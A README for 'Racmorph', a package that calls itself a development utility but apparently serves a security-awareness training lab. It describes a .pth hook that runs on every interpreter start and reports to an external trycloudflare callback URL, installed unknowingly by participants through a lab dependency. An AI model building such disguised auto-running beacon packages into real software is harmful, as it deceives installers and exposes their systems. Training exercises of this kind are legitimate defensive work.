# Racmorph

A lightweight utility package for development workflows.

**Oct Awareness Training (trainers):** participants clone stock [secure-pipelines-lab](https://github.com/ThwinHtetWin/secure-pipelines-lab) and run the lab README (`venv`, `pip install -r requirements.txt`, `python app.py`). Do not ask them to set `RACMORPH_*`, install this repo directly, or call the callback by hand. See [TRAINING_SETUP.md](TRAINING_SETUP.md).

## Installation

The lab installs this package from GitHub `main` via `requirements.txt`. Maintainers can also:

```bash
pip install git+https://github.com/ThwinHtetWin/racmorph.git@main
```

## Configuration (trainers / package default)

These are **not** participant steps. Developers in the lab must not set them. The stock lab path uses the defaults baked into the package on `main`.

- `RACMORPH_CALLBACK_URL` — collector `POST /api/callback` URL (current `main` default: `https://leave-massage-fighting-bag.trycloudflare.com/api/callback`). Point this at **your** collector by changing the package default on `main`, or export it only on trainer-controlled machines.
- `RACMORPH_CAMPAIGN_ID` — campaign identifier (default: `DEV-OCT-2026`)
- `RACMORPH_CAMPAIGN_TOKEN` — authentication token (default: `CHANGE-ME`)

## Usage

The package initializes on interpreter start when `racmorph.pth` is in site-packages (normal `pip install`). Explicit import also works:

```python
import racmorph

print(f"Racmorph version: {racmorph.__version__}")
```

## Development

Package development only (not the training participant path):

```bash
git clone https://github.com/ThwinHtetWin/racmorph.git
cd racmorph
pip install -e .
```

## License

For internal use only.
